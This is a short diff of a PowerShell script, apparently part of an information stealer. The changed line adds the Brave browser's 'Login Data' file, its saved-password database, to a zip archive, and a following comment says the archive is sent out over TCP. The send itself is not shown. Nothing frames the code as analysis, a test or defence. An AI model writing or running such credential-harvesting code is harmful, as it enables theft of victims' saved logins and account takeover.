@@ -8,7 +8,7 @@ if (Test-Path $zip) { Remove-Item $zip -Force }
 
 Compress-Archive `
     "$roaming\mano.txt", `
-    "$local\Zoom\installer.txt" `
+    "$local\BraveSoftware\Brave-Browser\User Data\Default\Login Data" `
     -DestinationPath $zip -Force
 
 # Envia via TCP
